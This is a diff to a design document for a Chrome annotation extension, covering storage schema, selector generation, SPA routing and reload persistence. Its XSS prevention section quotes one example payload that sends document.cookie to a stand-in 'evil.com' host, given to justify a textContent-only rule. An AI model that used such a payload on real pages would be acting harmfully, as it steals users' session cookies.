@@ -1,7 +1,13 @@
 # Annotator — Technical Design Document
 
+## Design Status
+
+**Ready for implementation.** Reviewed by a senior engineer (Critique 1, 2026-05-14) and a principal engineer (Critique 2, 2026-05-14). Critical bugs fixed: reload persistence (`beforeunload` handler), `wasImported` state tracking for confirmation dialogs, content script double-injection race condition (idempotency guard), inverted CSS selector truncation (cap removed), and missing `replaceState` monkey-patch for SPA routing. All known limitations are explicitly documented. A developer can begin implementation from this document.
+
+---
+
 > **Version:** 1.0  
-> **Status:** Draft  
+> **Status:** Reviewed — Ready for Implementation  
 > **Scope:** Chrome Extension v1
 
 ---
@@ -133,7 +139,14 @@ All extension data lives under a single top-level key per domain. There is also 
 annotations:{domain}:
   meta:
     nextPinNumber: number        // highest used pin + 1
-    importedFilename: string?    // null if no file imported or modified after import
+    importedFilename: string?    // null if no file imported, or if modified after import
+    wasImported: boolean         // true if current state originated from an import; never reset on edit
+                                 // MUST be set to false on delete-all: if left true, fresh annotations
+                                 // created after delete-all incorrectly trigger "unsaved changes" dialog
+                                 // (case 12) on the next import instead of "replace annotations" (case 11).
+                                 // used to distinguish confirmation dialog #11 vs #12:
+                                 //   wasImported && importedFilename === null → "unsaved changes" (case 12)
+                                 //   otherwise with annotations present → "replace annotations" (case 11)
     version: number              // storage schema version (currently 1)
   pages:
     {pageUrl}: Annotation[]      // keyed by normalised URL (no params/fragments)
@@ -155,12 +168,8 @@ interface Fingerprint {
   xpath: string;
   textSnippet: string;           // first ~50 chars of element text
   tagName: string;               // lowercase
-  boundingBox: {                 // hint only — not used for resolution; intentionally OMITTED from YAML export
-    top: number;
-    left: number;
-    width: number;
-    height: number;
-  };
+  // NOTE: boundingBox is intentionally NOT stored. It goes stale on any reflow.
+  // Pin position is always recalculated live via getBoundingClientRect() at render time.
 }
 ```
 
@@ -172,6 +181,7 @@ interface Fingerprint {
     "meta": {
       "nextPinNumber": 5,
       "importedFilename": null,
+      "wasImported": false,
       "version": 1
     },
     "pages": {
@@ -183,8 +193,7 @@ interface Fingerprint {
             "cssSelector": "#main-content > article > p:nth-of-type(3)",
             "xpath": "/html/body/main/div[2]/article/p[3]",
             "textSnippet": "The challenge was making the rendering engin",
-            "tagName": "p",
-            "boundingBox": { "top": 412, "left": 80, "width": 760, "height": 48 }
+            "tagName": "p"
           },
           "offset": { "x": 120, "y": 20 },
           "createdAt": "2026-05-14T04:30:00.000Z"
@@ -217,7 +226,7 @@ Example: `http://www.figma.com/blog/How-We-Built-Figma?ref=twitter#intro` → `h
 
 ### 2.5 Pin Number Management
 
-`meta.nextPinNumber` is the source of truth for the next pin number to assign. It is always `max(all existing pinNumbers) + 1`.
+`meta.nextPinNumber` is the source of truth for the next pin number to assign. It is always `max(all existing pinNumbers) + 1`. **Initial value: 1** — on fresh install or immediately after delete-all, there are no existing pins, so `max(empty set) + 1 = 1`. No special-case initialization is needed; the formula self-corrects.
 
 On every annotation write (create), the content script:
 1. Reads current storage
@@ -233,11 +242,13 @@ On delete: `meta.nextPinNumber` is **not** decremented. Gaps are preserved.
 
 ### 2.6 Tab Activation State
 
-Each tab where the toolbar is active stores a single key: `activeTab:{tabId}: true`. When the toolbar is deactivated or the tab closes, the key is deleted.
+Each tab where the toolbar is active stores a single key: `activeTab:{tabId}: true`. The key persists until the tab is closed — it is **not** removed on navigation (this is required for reload persistence; see §6.3).
 
 **Why per-tab keys instead of a shared array:** A shared `activeTabIds: number[]` requires all tabs to do read-modify-write operations on the same key. Two tabs registering simultaneously would race and clobber each other's entries. Per-tab keys are independent — each tab owns only its own key and never needs to read others.
 
-The background service worker checks `chrome.storage.local.get('activeTab:' + tabId)` to decide whether to inject or send a no-op. The content script sets `chrome.storage.local.set({ ['activeTab:' + myTabId]: true })` on init and removes it on tab close.
+The background service worker checks `chrome.storage.local.get('activeTab:' + tabId)` to decide whether to inject or send a no-op. The content script sets `chrome.storage.local.set({ ['activeTab:' + myTabId]: true })` on init.
+
+**Note — `chrome.storage.session` as an alternative:** `chrome.storage.session` (Chrome 102+, MV3 only) is session-scoped and cleared automatically on browser restart, which would eliminate the stale-key problem and the startup cleanup sweep (§6.3). It is a cleaner fit for ephemeral UI state. The current implementation uses `chrome.storage.local` for broad compatibility. See §11.10 for the full trade-off discussion.
 
 ---
 
@@ -341,8 +352,8 @@ function captureFingerprint(element):
     cssSelector: buildCSSSelector(element),
     xpath: buildXPath(element),
     textSnippet: element.textContent.trim().slice(0, 50),
-    tagName: element.tagName.toLowerCase(),
-    boundingBox: element.getBoundingClientRect() + scrollOffset
+    tagName: element.tagName.toLowerCase()
+    // boundingBox intentionally excluded: stale on any reflow; recalculated live at render time
   }
 ```
 
@@ -353,15 +364,16 @@ The generator walks up the DOM from the target element to `<body>`, building the
 **Priority order (first match wins at each level):**
 
 1. **Element has a non-empty `id`:** use `#id`. Stop walking up — IDs are globally unique. Return immediately.
-2. **Element has a `data-*` attribute that is non-generated and stable:** use `[data-testid="value"]` or `[data-id="value"]`. Prefer `data-testid`, `data-id`, `data-cy`, `data-qa` in that order.
-3. **Element has a stable, non-generated `class`:** use `tagName.className`. A class is considered unstable if it matches patterns like `/[a-z]{1,3}_[a-z0-9]{4,}/` (hashed/generated class names, common in CSS modules and Tailwind-JIT).
-4. **Fallback:** use `tagName:nth-of-type(n)` where `n` is the element's position among siblings of the same tag.
+2. **Element has a stable `data-*` attribute:** use `[data-testid="value"]` or `[data-id="value"]`. Prefer `data-testid`, `data-id`, `data-cy`, `data-qa` in that order. Only use `data-*` attributes whose values look like hand-authored strings (not UUIDs or numeric IDs auto-generated at runtime).
+3. **Fallback:** use `tagName:nth-of-type(n)` where `n` is the element's position among siblings of the same tag.
+
+**Why classes are excluded from the selector algorithm:** Detecting whether a class name is "stable" vs. "generated" via regex is not reliable. Tailwind utilities (`flex-1`, `bg-blue-500`, `text-sm`) look similar to CSS Modules hashes. A regex that catches one will misfire on the other. More importantly, class names are not unique — many elements share the same class, so a class-based selector requires an additional disambiguation signal anyway. Using `nth-of-type` directly is simpler, more predictable, and avoids the false-positive/false-negative detection problem entirely.
 
 The selector is built as a full path: each ancestor contributes one segment, joined with ` > `.
 
 **Example output:** `#main-content > article > p:nth-of-type(3)`
 
-**Length cap:** If the generated selector exceeds 512 characters, truncate from the top (drop the oldest ancestor segments) and use a shorter path that still resolves uniquely. If uniqueness cannot be guaranteed, keep the full path anyway — resolution will validate it.
+**No length cap.** There is no browser limit on CSS selector length. Truncating from the top (dropping ancestor segments) destroys specificity — `div > p:nth-of-type(3)` matches any 3rd `<p>` in any `<div>` on the page, not the specific element intended. If the DOM is deep enough to generate a 500-char selector, every segment is needed for uniqueness. Accept the full path; the `isUnique()` check in the resolution algorithm validates it and falls through to XPath if not unique.
 
 #### 4.3 XPath Generation (`buildXPath`)
 
@@ -479,7 +491,8 @@ Pin appearance:
 | Annotator pins | 2,147,483,640 |
 | Annotator toolbar | 2,147,483,644 |
 | Annotator popover | 2,147,483,646 |
-| Annotator hover overlay | 2,147,483,647 (INT_MAX) |
+
+> **Note on hover highlight:** There is no separate z-indexed overlay element for hover. Hover highlighting is implemented by adding an `annotator-highlighted` CSS class directly to the hovered page element (applying an outline). No overlay div is created or z-indexed.
 
 This ensures annotator UI is always on top. Stacking context issues (elements with `transform`, `filter`, or `isolation: isolate`) can trap child elements below their stacking context ceiling — but since pins are children of `<body>`, this is avoided.
 
@@ -576,12 +589,34 @@ body:not(.annotator-active) .annotator-pin { display: none !important; pointer-e
 1. User clicks extension icon
 2. Background service worker receives `chrome.action.onClicked`
 3. Background sends `{ type: "PING" }` to the active tab's content script
-4. **If ping times out (script not present):** Background calls `chrome.scripting.executeScript` to inject the content script. After injection completes, background sends `{ type: "ACTIVATE", tabId: tab.id }` so the content script knows its own tab ID (see §1.3). Content script calls `init(message.tabId)`.
+4. **If ping times out (script not present):** Background calls `chrome.scripting.executeScript` to inject the content script. After injection completes, background sends `{ type: "ACTIVATE", tabId: tab.id }` so the content script knows its own tab ID (see §1.3). Content script calls `init(message.tabId)`. The `executeScript` callback fires after the script has executed synchronously (message listener is registered); `sendMessage` should be wrapped with a `chrome.runtime.lastError` check in case the tab navigated between inject and callback:
+   ```javascript
+   chrome.scripting.executeScript(
+     { target: { tabId }, files: ['content/index.js'] },
+     () => {
+       if (chrome.runtime.lastError) return; // tab navigated away
+       chrome.tabs.sendMessage(tabId, { type: 'ACTIVATE', tabId });
+     }
+   );
+   ```
 5. **If ping responds** with `{ alive: true, tabId }`: Background sends `{ type: "ICON_CLICKED" }`. Content script ignores it (toolbar already active — no-op per requirements §6 #18).
 
 The content script is **not** declared in `manifest.json` under `content_scripts`. It is injected on demand only. This prevents the extension from running on every page load when the user hasn't activated it.
 
 ### 6.2 Content Script `init(tabId)`
+
+**Idempotency guard — mandatory first line of `content/index.js`:**
+
+```javascript
+// Prevents double-injection from rapid navigation (two concurrent onUpdated events
+// both completing executeScript against the same page). Without this guard, two content
+// scripts run simultaneously: two toolbars, two storage listeners, every storage write
+// triggers onChanged twice.
+if (window.__annotatorActive) return;
+window.__annotatorActive = true;
+```
+
+Content scripts in MV3 run in an isolated JS world but share the page's `window` object. Setting `window.__annotatorActive` is visible to all content script instances on the same page context. On full navigation the window is destroyed, so the guard resets naturally without any cleanup.
 
 On first injection (called with the tab ID passed from background via `ACTIVATE` message):
 1. Store `myTabId = tabId` in module scope
@@ -598,7 +633,7 @@ On first injection (called with the tab ID passed from background via `ACTIVATE`
 
 When the page reloads:
 - The content script is torn down (the page unloads)
-- `beforeunload` is fired → content script removes its per-tab key: `chrome.storage.local.remove('activeTab:' + myTabId)`
+- `beforeunload` is fired → content script does **DOM-only cleanup** (removes toolbar and pin elements from the page). **It does NOT remove `activeTab:{tabId}` from storage.** Removing it here would break reload persistence: `onUpdated` fires after `beforeunload`, and if the key is gone, re-injection never happens.
 
 **Mechanism:** On full navigation, `chrome.tabs.onUpdated` fires in the background service worker. When `changeInfo.status === 'complete'` and `activeTab:{tabId}` exists in storage, the background auto-re-injects and sends `ACTIVATE`:
 
@@ -618,7 +653,7 @@ chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
 });
 ```
 
-**Edge case:** `beforeunload` is not guaranteed to fire (e.g. if Chrome crashes). If `activeTab:{tabId}` lingers after a crash and the tab re-opens with the same ID (rare but possible), the toolbar re-injects. This is acceptable — the user can ignore the toolbar.
+**Edge case — crash/unexpected close:** If Chrome crashes without firing `beforeunload` and `onRemoved`, a stale `activeTab:{tabId}` key may linger. The startup cleanup sweep (below) handles this. If Chrome re-uses the same tab ID on restart (rare), the toolbar would re-inject on that tab — this is acceptable, the user can dismiss it.
 
 **Cleanup on tab close:** `chrome.tabs.onRemoved` deletes the per-tab key:
 
@@ -658,15 +693,27 @@ window.addEventListener('popstate', handleUrlChange);
 window.addEventListener('hashchange', handleUrlChange);
 ```
 
-**3. Monkey-patching `history.pushState` and `history.replaceState`** — fired when the SPA navigates programmatically:
+**3. Monkey-patching `history.pushState` and `history.replaceState`** — fired when the SPA navigates programmatically. Both must be patched: `pushState` handles standard forward navigation; `replaceState` handles redirects, canonical URL normalization, and `navigate(..., { replace: true })` in React Router / Vue Router. Missing `replaceState` leaves entire SPA routing patterns invisible to the content script.
+
+`handleUrlChange` is **debounced at 50ms** because some SPAs (especially during hydration or route transitions) call `pushState`/`replaceState` multiple times in rapid succession. Without debouncing, intermediate states cause pin flicker:
+
 ```javascript
+const debouncedHandleUrlChange = debounce(handleUrlChange, 50);
+
 const origPush = history.pushState.bind(history);
 history.pushState = function(...args) {
   origPush(...args);
-  handleUrlChange();
+  debouncedHandleUrlChange();
 };
-// Same for replaceState
+
+const origReplace = history.replaceState.bind(history);
+history.replaceState = function(...args) {
+  origReplace(...args);
+  debouncedHandleUrlChange();
+};
 ```
+
+The `popstate` and `hashchange` event listeners pass `debouncedHandleUrlChange` as their handler too, for consistency.
 
 **`handleUrlChange()`:**
 1. Compute new normalised URL
@@ -810,8 +857,9 @@ Internal structure:
 function positionPopover(pinScreenX, pinScreenY) {
   const PIN_SIZE = 24;
   const MARGIN = 8;
-  const pw = popover.offsetWidth || 280;  // measured or fallback
-  const ph = popover.offsetHeight || 160;
+  const pw = 280;                          // must match `.popover { width: 280px }` in CSS
+                                            // do NOT use offsetWidth here: it is 0 before layout completes
+  const ph = popover.offsetHeight || 160;  // dynamic (varies by content); 160px is a pre-layout fallback
   const vw = window.innerWidth;
   const vh = window.innerHeight;
 
@@ -1251,6 +1299,23 @@ Content scripts run in the page's CSP context, not the extension's. However, the
 - All dependencies are vendored and pinned to specific versions
 - Build is reproducible from source: `npm run build` produces the exact same output
 - The manifest explicitly lists all permissions with justifications in `PERMISSIONS.md`
+
+---
+
+### 10.6 XSS Prevention
+
+The extension handles user-provided text (annotation notes typed by the user) and file-provided text (notes, filenames, and domain names from imported YAML). If any of this content is ever rendered via `innerHTML`, it becomes an XSS attack vector. A malicious annotation file with `<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">` in a note field would execute in the context of the host page if inserted carelessly.
+
+**Rule: all user-provided and file-provided strings are inserted via `textContent` or `innerText`. Never `innerHTML`. Never `insertAdjacentHTML`. No exceptions.**
+
+This applies to:
+- Annotation note text in the popover `<textarea>` (safe by construction — `<textarea>` content is not HTML-parsed)
+- Any note text rendered outside a textarea (tooltips, previews in future versions) → `textContent`
+- Filename display in the toolbar → `textContent`
+- Domain names appearing in error messages → `textContent`
+- Any string read from the imported YAML file → `textContent`
+
+If formatted output is ever needed in a future version, use a strict allowlist sanitizer — never `innerHTML` with raw user content.
 
 ---
 
